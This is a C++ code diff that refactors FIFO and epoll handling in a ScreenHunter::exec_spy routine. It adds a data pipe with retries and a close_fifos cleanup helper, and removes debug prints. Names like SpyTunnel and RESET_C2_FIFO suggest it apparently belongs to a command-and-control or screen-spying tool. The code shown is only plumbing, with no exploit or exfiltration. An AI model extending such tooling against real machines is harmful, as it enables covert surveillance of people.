@@ -7,11 +7,25 @@ void ScreenHunter::exec_spy() {
         return;
     }
 
-    fifo_in_ = fifo_path_ + (std::string) "_in"; // screen hunter command line READ_ONLY
+    fifo_data_ = fifo_path_ + (std::string) "_data";
+    fifo_in_ = fifo_path_ + (std::string) "_in";
 
-    int tunnel_fifo_in_ = open(fifo_in_.c_str(), O_RDONLY | O_NONBLOCK);
+    int tries = 0;
+    while ((tunnel_fifo_data_ = open(fifo_data_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
+        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    }
+
+    if (tunnel_fifo_data_ == -1) {
+        std::cerr << RED << "[SpyTunnel::run] Error opening data FIFO file" << RESET;
+        close_fifos();
+        return;
+    }
+
+    tunnel_fifo_in_ = open(fifo_in_.c_str(), O_RDONLY | O_NONBLOCK);
     if (tunnel_fifo_in_ < 0) {
         write_fifo_error("Error while opening the fifo path");
+        close_fifos();
         return;
     }
 
@@ -19,6 +33,7 @@ void ScreenHunter::exec_spy() {
     rc = create_epoll_fd(epoll_fd);
     if (rc < 0) {
         write_fifo_error("[SpyTunnel::run] Error creating epoll_fd" + std::string(strerror(errno)));
+        close_fifos();
         return;
     }
 
@@ -45,22 +60,18 @@ void ScreenHunter::exec_spy() {
     struct epoll_event events[3];
     while (true) {
         int nfds = epoll_wait(epoll_fd.fd, events, 3, -1);
-        std::cout << MAGENTA << "Shit1" <<  RESET;
-
         if (nfds < 0) {
             return;
         }
 
         for (int i=0;i<nfds;i++) {
             if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
-                std::cout << MAGENTA << "Shit2" <<  RESET;
                 // Server shuts down
                 uint64_t u;
                 read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                 if (tunnel_fifo_ != -1) {
                     write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
-                    close(tunnel_fifo_);
-                    close(tunnel_fifo_in_);
+                    close_fifos();
                 }
                 return;
             } else if (events[i].data.fd == tunnel_fifo_in_) {
@@ -78,14 +89,12 @@ void ScreenHunter::exec_spy() {
                 if (rc <= 0) {
                     std::cout << MAGENTA << "Failed to send the command" << RESET << std::endl;
                     write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
-                    close(tunnel_fifo_in_);
+                    close_fifos();
                     return;
                 }
 
-
                 if (strncmp(command, "exit", 4) == 0) {
-                    close(tunnel_fifo_);
-                    close(tunnel_fifo_in_);
+                    close_fifos();                    
                     return;
                 } 
             } else if (events[i].data.fd == tunnel_end_socket_) {
@@ -95,17 +104,14 @@ void ScreenHunter::exec_spy() {
                 if (rc <= 0) {
                     std::cout << MAGENTA << "Failed tp receive from tunnel_end_socket_" << RESET << std::endl;
                     write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
-                    close(tunnel_fifo_in_);
+                    close_fifos();
                     return;
                 }
-                std::cout << MAGENTA << "Shit3" <<  RESET;
-
                 rc = write(tunnel_fifo_, buffer, rc);
                 if (rc <= 0) {
-                    close(tunnel_fifo_);
-                    close(tunnel_fifo_in_);
                     tunnel_fifo_ = -1;
                     write_fifo_error("[SpyTunnel::run] Was unable to write buffer to tunnel_fifo_");
+                    close_fifos();
                     return;
                 }
             }
@@ -124,4 +130,18 @@ void ScreenHunter::spawn_window() {
         RES_UPDATE_KEY, res_update_key_len_str.c_str(),
         (char*)NULL
     );
+}
+
+void ScreenHunter::close_fifos() {
+    if (tunnel_fifo_ != -1) {
+        close(tunnel_fifo_);
+    }
+
+    if (tunnel_fifo_in_ != -1) {
+        close(tunnel_fifo_in_);
+    }
+
+    if (tunnel_fifo_data_ != -1) {
+        close(tunnel_fifo_data_);
+    }
 }
